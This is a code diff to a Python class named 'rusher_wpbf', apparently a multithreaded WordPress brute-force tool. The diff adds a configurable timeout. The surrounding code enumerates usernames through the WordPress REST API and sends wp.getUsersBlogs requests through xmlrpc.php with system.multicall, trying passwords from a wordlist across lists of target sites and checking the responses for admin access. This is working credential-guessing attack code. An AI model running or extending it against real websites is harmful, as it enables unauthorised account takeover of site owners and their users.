@@ -32,7 +32,7 @@ class rusher_wpbf:
         try:
 
             xmldata = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data></data></array></value></param></params></methodCall>'
-            x = requests.post(url="{}/xmlrpc.php".format(target), data=xmldata, headers={ "User-Agent": self.useragent(), "Content-Type": "application/xml" }, timeout=5)
+            x = requests.post(url="{}/xmlrpc.php".format(target), data=xmldata, headers={ "User-Agent": self.useragent(), "Content-Type": "application/xml" }, timeout=self.args.timeout)
 
             if '<methodResponse>' in x.text:
 
@@ -50,7 +50,7 @@ class rusher_wpbf:
 
         try:
 
-            x = requests.get(url="{}/wp-json/wp/v2/users/1".format(target), headers={ "User-Agent": self.useragent(), "Content-Type": "application/xml" }, timeout=5)
+            x = requests.get(url="{}/wp-json/wp/v2/users/1".format(target), headers={ "User-Agent": self.useragent(), "Content-Type": "application/xml" }, timeout=self.args.timeout)
             return x.json()['name']
 
         except:
@@ -62,7 +62,7 @@ class rusher_wpbf:
         try:
 
             xml = """<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{}</string></value><value><string>{}</string></value></data></array></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>""".format(user, passwd)
-            x = requests.post(url="{}/xmlrpc.php".format(target), headers={ "User-Agent": self.useragent(), "Content-Type": "application/xml" }, data=xml, timeout=5)
+            x = requests.post(url="{}/xmlrpc.php".format(target), headers={ "User-Agent": self.useragent(), "Content-Type": "application/xml" }, data=xml, timeout=self.args.timeout)
 
             if "<name>isAdmin</name>" in x.text:
 
@@ -117,39 +117,40 @@ class rusher_wpbf:
         parser.add_argument("-x", "--target", required=True)
         parser.add_argument("-w", "--wordlist", required=True)
         parser.add_argument("-t", "--thread", required=True, type=int)
-        args = parser.parse_args()
+        parser.add_argument("-d", "--timeout", required=True, type=int)
+        self.args = parser.parse_args()
 
-        if os.path.isfile(args.target):
+        if os.path.isfile(self.args.target):
 
-            if os.path.isfile(args.wordlist):
+            if os.path.isfile(self.args.wordlist):
 
                 print("[*] Bruteforcing...")
 
-                with concurrent.futures.ThreadPoolExecutor(max_workers=args.thread) as executor:
+                with concurrent.futures.ThreadPoolExecutor(max_workers=self.args.thread) as executor:
 
-                    for target in open(args.target, errors="ignore").read().split("\n"):
+                    for target in open(self.args.target, errors="ignore").read().split("\n"):
 
                         if target != '':
 
-                            self.total_process = len(open(args.wordlist).read().splitlines()) * len(open(args.target).read().splitlines())
-                            executor.submit(self.execution, target, args.wordlist, args.thread)
+                            self.total_process = len(open(self.args.wordlist).read().splitlines()) * len(open(self.args.target).read().splitlines())
+                            executor.submit(self.execution, target, self.args.wordlist, self.args.thread)
 
             else:
 
-                print("[-] [Error] -> ( Not found {} )".format(args.wordlist))
+                print("[-] [Error] -> ( Not found {} )".format(self.args.wordlist))
 
         else:
 
-            if os.path.isfile(args.wordlist):
+            if os.path.isfile(self.args.wordlist):
 
                 print("[*] Bruteforcing...")
 
-                self.total_process = len(open(args.wordlist).read().splitlines())
-                self.execution(args.target, args.wordlist, args.thread)
+                self.total_process = len(open(self.args.wordlist).read().splitlines())
+                self.execution(self.args.target, self.args.wordlist, self.args.thread)
 
             else:
 
-                print("[-] [Error] -> ( Not found {} )".format(args.wordlist))
+                print("[-] [Error] -> ( Not found {} )".format(self.args.wordlist))
 
         print("\n[*] Done!")
 
